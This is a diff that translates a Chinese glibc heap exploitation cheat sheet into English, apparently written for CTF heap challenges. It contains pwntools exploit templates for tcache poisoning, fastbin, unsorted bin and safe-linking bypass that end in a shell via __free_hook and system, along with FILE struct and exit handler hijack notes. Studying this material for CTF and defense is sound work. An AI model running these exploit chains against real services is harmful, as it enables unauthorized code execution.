@@ -1,35 +1,35 @@
-# 堆类利用 (Heap Pwn)
+# Heap Exploitation (Heap Pwn)
 
-## glibc 版本差异（必看）
+## glibc Version Differences (Must Read)
 
-堆利用的所有技术都跟 glibc 版本强绑定。先确认版本：
+All heap exploitation techniques are tightly bound to the glibc version. Confirm the version first:
 
 ```bash
 ./libc.so.6 | head -1
 # GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.
 
-# 或 strings
+# or strings
 strings ./libc.so.6 | grep "GNU C Library"
 ```
 
-| glibc 版本 | 关键变化 | 影响 |
+| glibc Version | Key Change | Impact |
 |-----------|---------|------|
-| 2.26 及之前 | 无 tcache | unsorted/fastbin 是主战场 |
-| 2.27 | **引入 tcache** | tcache poisoning 极其简单 |
-| 2.29 | unsorted bin unlink 加固（chunk size 检查） | unsorted bin attack 被砍 |
-| 2.31 | tcache 多重检查（key 字段） | tcache poisoning 略复杂 |
-| 2.32 | **safe-linking**（fd 指针异或 PROTECT_PTR） | 需要先 leak heap base |
-| 2.34 | **移除 __free_hook / __malloc_hook** | 改走 FILE struct / exit handlers |
-| 2.35+ | 进一步加固 | 同 2.34，FILE 路径仍可用 |
+| 2.26 and earlier | No tcache | unsorted/fastbin is the main battleground |
+| 2.27 | **tcache introduced** | tcache poisoning becomes trivially easy |
+| 2.29 | unsorted bin unlink hardening (chunk size checks) | unsorted bin attack cut off |
+| 2.31 | Multiple tcache checks (key field) | tcache poisoning slightly more complex |
+| 2.32 | **safe-linking** (fd pointer XORed with PROTECT_PTR) | Must leak the heap base first |
+| 2.34 | **__free_hook / __malloc_hook removed** | Pivot to FILE struct / exit handlers |
+| 2.35+ | Further hardening | Same as 2.34, the FILE path still works |
 
 ## tcache poisoning (2.27 - 2.31)
 
-### 原理
+### Principle
 
-tcache 是 per-thread cache，每个 size class 一条链表，单链表（只有 fd）。
-double free 检查在 2.29 之前只看链表头是不是自己，不看遍历。
+tcache is a per-thread cache with one linked list per size class, singly linked (fd only).
+Before 2.29, the double-free check only looked at whether the head of the list was itself, without walking the list.
 
-### 利用模板（2.27 - 2.31）
+### Exploitation Template (2.27 - 2.31)
 
 ```python
 from pwn import *
@@ -53,52 +53,52 @@ def show(idx):
     return p.recvline().strip()
 
 # === Step 1: leak libc base ===
-# 申请大于 tcache 范围的 chunk（>0x408），free 进 unsorted bin，残留 main_arena 指针
+# Allocate chunks beyond the tcache range (>0x408), free into unsorted bin, leftover main_arena pointer
 for i in range(8):
     add(i, 0x80)
-add(8, 0x80)  # 防止合并
+add(8, 0x80)  # prevent consolidation
 for i in range(7):
     free(i)
-free(7)       # 第 8 个进 unsorted bin，fd/bk 指向 main_arena+96
-add(9, 0x80)  # 切回来一部分，保留 fd
+free(7)       # the 8th goes into unsorted bin, fd/bk point to main_arena+96
+add(9, 0x80)  # split part of it back, preserving fd
 leak = u64(show(9).ljust(8, b'\x00'))
-libc.address = leak - 0x3ebca0  # main_arena+96 偏移，glibc 2.27 amd64
+libc.address = leak - 0x3ebca0  # main_arena+96 offset, glibc 2.27 amd64
 log.success(f'libc = {hex(libc.address)}')
 
-# === Step 2: tcache poisoning → 写 __free_hook ===
+# === Step 2: tcache poisoning → write __free_hook ===
 add(10, 0x30)
 add(11, 0x30)
 free(10)
 free(11)
-# 用 UAF 改 chunk11 的 fd 指向 __free_hook
+# Use UAF to change chunk11's fd to point to __free_hook
 edit(11, p64(libc.sym['__free_hook']))
-add(12, 0x30)  # 取出 chunk11
-add(13, 0x30, p64(libc.sym['system']))  # 取出来的就是 __free_hook 地址，写 system
+add(12, 0x30)  # take out chunk11
+add(13, 0x30, p64(libc.sym['system']))  # what comes out is the __free_hook address, write system
 
-# 触发：free 一个内容为 "/bin/sh\x00" 的 chunk
+# Trigger: free a chunk whose content is "/bin/sh\x00"
 add(14, 0x30, b'/bin/sh\x00')
 free(14)
 
 p.interactive()
 ```
 
-## safe-linking 绕过 (2.32+)
+## safe-linking Bypass (2.32+)
 
 ```text
-原理：tcache/fastbin 的 fd 写入时被 PROTECT_PTR 异或：
+Principle: the fd of tcache/fastbin is XORed with PROTECT_PTR when written:
     PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr
 
-绕过：
-1. 必须先 leak 一个堆地址（heap base）
-2. 计算 obfuscated 值：fake_fd_obf = (chunk_addr >> 12) ^ target
-3. 写进去
+Bypass:
+1. Must leak a heap address first (heap base)
+2. Compute the obfuscated value: fake_fd_obf = (chunk_addr >> 12) ^ target
+3. Write it in
 ```
 
 ```python
 def protect_ptr(pos, ptr):
     return (pos >> 12) ^ ptr
 
-# leak heap base（unsorted bin 残留 / tcache fd 残留）
+# leak heap base (unsorted bin leftover / tcache fd leftover)
 heap_base = leaked_heap & ~0xfff
 
 # poisoning
@@ -106,13 +106,13 @@ fake_fd = protect_ptr(heap_base + chunk_off, target_addr)
 edit(chunk_id, p64(fake_fd))
 ```
 
-## fastbin attack (传统，2.26 及之前为主)
+## fastbin attack (classic, mainly 2.26 and earlier)
 
 ```text
-关键点：
-1. fastbin 单链表（只有 fd），无 size 检查除了 chunk size 必须匹配
-2. 2.27 后 tcache 优先，fastbin 只有 tcache 满了才用
-3. 仍然需要伪造一个看起来像 chunk 的内存（size 字段 = 真实 chunk size，± 一些）
+Key points:
+1. fastbin is a singly linked list (fd only), no size checks except that the chunk size must match
+2. After 2.27, tcache takes priority; fastbin is only used once tcache is full
+3. You still need to forge memory that looks like a chunk (size field = real chunk size, ± a bit)
 ```
 
 ```python
@@ -123,110 +123,110 @@ free(0)
 free(1)
 free(0)  # fastbin: 0 → 1 → 0
 
-# 把 fd 改成 fake chunk（要求 fake_addr + 8 处的 size 字节匹配 0x70）
+# Change fd to a fake chunk (requires the size bytes at fake_addr + 8 to match 0x70)
 add(2, 0x60, p64(fake_addr))
 add(3, 0x60)
-add(4, 0x60)  # 取出 fake_addr 处的 chunk
+add(4, 0x60)  # take out the chunk at fake_addr
 ```
 
-## unsorted bin attack（仅 2.28 及之前）
+## unsorted bin attack (only 2.28 and earlier)
 
 ```text
-原理：写任意地址为 main_arena+88
-2.29 起加了 bck->fd == victim 的检查，绕不过
-用途：覆盖 global_max_fast 让小 chunk 也走 fastbin → 配合 fastbin attack
+Principle: write main_arena+88 to an arbitrary address
+From 2.29 onward, a bck->fd == victim check was added, cannot be bypassed
+Use: overwrite global_max_fast so small chunks also go through fastbin → combine with fastbin attack
 ```
 
 ```python
-# 申请 unsorted size chunk
+# Allocate unsorted-size chunks
 add(0, 0x100)
-add(1, 0x100)  # 防止 top consolidation
+add(1, 0x100)  # prevent top consolidation
 free(0)
-# UAF 改 bk 指针为 target - 0x10
+# UAF: change bk pointer to target - 0x10
 edit(0, p64(0) + p64(target - 0x10))
-add(2, 0x100)  # 从 unsorted 取出 → unlink → main_arena+88 写到 target
+add(2, 0x100)  # take out from unsorted → unlink → main_arena+88 written to target
 ```
 
 ## large bin attack
 
 ```text
-原理：large bin 比 unsorted 多一层 fd_nextsize / bk_nextsize
-2.32 起也加了 chunk size 检查，但仍可用于改 global_max_fast、_IO_list_all 等
-高级技巧，常用于 House of Husk 等组合拳
+Principle: large bin has an extra layer of fd_nextsize / bk_nextsize over unsorted
+2.32 also added chunk size checks, but it still works for overwriting global_max_fast, _IO_list_all, etc.
+An advanced technique, often used in combos like House of Husk
 ```
 
-## House of XXX 速查
+## House of XXX Quick Reference
 
-| 名称 | 适用版本 | 核心思想 |
+| Name | Applicable Versions | Core Idea |
 |------|---------|---------|
-| House of Force | 2.28 及之前 | 改 top chunk size 为巨大值 → malloc 任意地址 |
-| House of Lore | 全版本 | 伪造 small bin 链 → 返回任意地址 |
-| House of Orange | 2.23-2.30 | unsorted attack 改 _IO_list_all 触发 _IO_flush_all_lockp |
-| House of Roman | 2.23-2.26 | 12-bit 爆破 + fastbin attack to __malloc_hook |
-| House of Einherjar | 全版本 | 伪造 prev_size + PREV_INUSE=0 → backward consolidation |
-| House of Botcake | 2.27+ | tcache + unsorted bin 组合，绕过 tcache double free 检查 |
-| House of Husk | 2.27+ | 改 printf 的 hook table（__printf_function_table） |
-| House of Cat | 2.34+ | _IO_wfile_seekoff vtable 利用，针对无 hook 版本 |
+| House of Force | 2.28 and earlier | Overwrite top chunk size with a huge value → malloc at an arbitrary address |
+| House of Lore | All versions | Forge a small bin list → return an arbitrary address |
+| House of Orange | 2.23-2.30 | unsorted attack overwrites _IO_list_all to trigger _IO_flush_all_lockp |
+| House of Roman | 2.23-2.26 | 12-bit brute force + fastbin attack to __malloc_hook |
+| House of Einherjar | All versions | Forge prev_size + PREV_INUSE=0 → backward consolidation |
+| House of Botcake | 2.27+ | tcache + unsorted bin combination, bypasses the tcache double-free check |
+| House of Husk | 2.27+ | Overwrite printf's hook table (__printf_function_table) |
+| House of Cat | 2.34+ | _IO_wfile_seekoff vtable exploitation, targeting hook-less versions |
 | House of Apple | 2.34+ | _IO_wfile_jumps + setcontext gadget |
 
-## 真实利用步骤（通用 4 步）
+## Real-World Exploitation Steps (Generic 4 Steps)
 
 ```text
 Step 1: leak heap base
-  - 申请 chunk → free 到 tcache（2.32+ 保留 obfuscated fd） → show → 反推 heap
-  - 或：申请大 chunk → free 到 unsorted → 切回 → show fd
+  - Allocate a chunk → free into tcache (2.32+ keeps the obfuscated fd) → show → derive heap
+  - Or: allocate a large chunk → free into unsorted → split back → show fd
 
 Step 2: leak libc base
-  - 大 chunk free 到 unsorted bin，fd/bk 残留 main_arena 地址
+  - Free a large chunk into unsorted bin, fd/bk leave behind a main_arena address
   - show → leak → libc.address = leak - main_arena_offset
 
-Step 3: 控 IP
-  - 2.27-2.33: tcache/fastbin poisoning → 写 __free_hook 或 __malloc_hook
-  - 2.34+: FILE struct 攻击（_IO_2_1_stdout_ / stderr），改 vtable → _IO_wfile_jumps
-  - 或：劫持 exit handlers（__exit_funcs / tls_dtor_list）
+Step 3: Control IP
+  - 2.27-2.33: tcache/fastbin poisoning → write __free_hook or __malloc_hook
+  - 2.34+: FILE struct attack (_IO_2_1_stdout_ / stderr), overwrite vtable → _IO_wfile_jumps
+  - Or: hijack exit handlers (__exit_funcs / tls_dtor_list)
 
 Step 4: getshell
   - free_hook = system, free("/bin/sh") → shell
   - 2.34+: setcontext + 53 gadget → rop chain in heap → execve
 ```
 
-## libc 2.34+ 没有 hook 之后的替代路径
+## Alternative Paths After libc 2.34+ Removed Hooks
 
-### FILE struct 攻击（_IO_2_1_stdout_ / _IO_2_1_stderr_）
+### FILE struct Attack (_IO_2_1_stdout_ / _IO_2_1_stderr_)
 
 ```text
-目标：当程序调用 puts/printf 时，最终走到 _IO_file_xsputn → _IO_OVERFLOW → 调用 vtable
-劫持：
-  1. 覆盖 _IO_2_1_stderr_ 的 vtable 指针指向伪造的 vtable
-  2. 伪造 vtable，让 __overflow 字段指向 system 或 setcontext
-  3. 让 fp（FILE*）本身的前 8 字节是 "/bin/sh\x00"（作为 system 的 rdi）
-触发：任何 puts/printf/abort/exit 都会冲刷 stderr
+Goal: when the program calls puts/printf, it eventually reaches _IO_file_xsputn → _IO_OVERFLOW → vtable call
+Hijack:
+  1. Overwrite _IO_2_1_stderr_'s vtable pointer to point to a forged vtable
+  2. Forge the vtable so the __overflow field points to system or setcontext
+  3. Make the first 8 bytes of fp (FILE*) itself be "/bin/sh\x00" (as system's rdi)
+Trigger: any puts/printf/abort/exit flushes stderr
 ```
 
 ### Exit handlers (`__exit_funcs` / `tls_dtor_list`)
 
 ```text
-原理：__run_exit_handlers 遍历 __exit_funcs 链表，调用每个 dtor
-劫持：改链表节点的 func 指针指向 system，arg 指向 "/bin/sh"
-注意：2.34+ 加了 PTR_DEMANGLE，需要 leak tls 里的 fs:[0x30] guard 值才能伪造
+Principle: __run_exit_handlers walks the __exit_funcs list, calling each dtor
+Hijack: change a list node's func pointer to system, arg to "/bin/sh"
+Note: 2.34+ added PTR_DEMANGLE, need to leak the fs:[0x30] guard value in tls to forge
 ```
 
-### tls_dtor_list（更现代）
+### tls_dtor_list (more modern)
 
 ```text
-__call_tls_dtors 遍历，结构类似，同样要绕过 PTR_DEMANGLE
-适用：程序退出时会走，比 FILE 攻击更通用
+__call_tls_dtors walks it, similar structure, also has to bypass PTR_DEMANGLE
+Applies: runs on program exit, more universal than the FILE attack
 ```
 
-## pwndbg / GEF 堆调试命令
+## pwndbg / GEF Heap Debugging Commands
 
 ```text
 # pwndbg
-heap              # 显示当前 arena 所有 chunk
-bins              # 显示 tcache / fastbin / unsorted / small / large bins
-tcache            # 单独看 tcache
-find_fake_fast <addr> <size>  # 找一个能用作 fake chunk 的 fd 写入点
-vis_heap_chunks   # 可视化堆布局
+heap              # show all chunks in the current arena
+bins              # show tcache / fastbin / unsorted / small / large bins
+tcache            # look at tcache alone
+find_fake_fast <addr> <size>  # find an fd write target usable as a fake chunk
+vis_heap_chunks   # visualize the heap layout
 
 # GEF
 heap chunks
@@ -235,7 +235,7 @@ heap bins tcache
 heap chunk <addr>
 ```
 
-## 典型 pwntools 模板（heap menu 题）
+## Typical pwntools Template (heap menu challenge)
 
 ```python
 from pwn import *
@@ -245,7 +245,7 @@ libc = ELF('./libc.so.6')
 
 p = process('./vuln') if not args.REMOTE else remote('host', 1337)
 
-# IO 包装
+# IO wrappers
 def menu(choice):
     p.sendlineafter(b'choice:', str(choice).encode())
 
@@ -270,14 +270,14 @@ def edit(idx, data):
     p.sendlineafter(b'idx:', str(idx).encode())
     p.sendafter(b'data:', data)
 
-# === 后续根据漏洞类型选择技术栈 ===
+# === Afterwards, choose the technique stack based on the vulnerability type ===
 ```
 
-## 注意事项
+## Notes
 
-- **glibc 版本是第一性问题** — 同一个二进制配 2.27 libc 和 2.34 libc，利用路径完全不同
-- **tcache 容量 = 7**（每个 size class）— 喷射够 7 个才会溢出到 unsorted/fastbin
-- **chunk size = 用户请求 + 0x10 头部，向 0x10 对齐**（不算 0x10 头时实际可写超出 0x8 因为下一个 chunk 的 prev_size 被复用）
-- **远程堆喷不稳** — 服务端 fork 模型每次连接 brk/mmap 可能不同，要做随机化测试
-- **不要在 attack 链中遗留 unsorted 残留** — main_arena 指针出现在意外的 chunk 里会让后续 show 输出错乱
-- **safe-linking 错误率** — 计算 PROTECT_PTR 时记得是 `pos >> 12`，pos 是要写入的地址不是要指向的地址
+- **The glibc version is the first-order question** — the same binary with a 2.27 libc versus a 2.34 libc has completely different exploitation paths
+- **tcache capacity = 7** (per size class) — you must spray 7 before overflow into unsorted/fastbin
+- **chunk size = user request + 0x10 header, aligned to 0x10** (excluding the 0x10 header, you can actually write 0x8 beyond because the next chunk's prev_size is reused)
+- **Remote heap spraying is unstable** — with a fork-model server, brk/mmap may differ per connection, do randomized testing
+- **Do not leave unsorted leftovers in the attack chain** — a main_arena pointer appearing in an unexpected chunk will garble subsequent show output
+- **safe-linking error rate** — when computing PROTECT_PTR, remember it is `pos >> 12`, where pos is the address being written to, not the address being pointed to
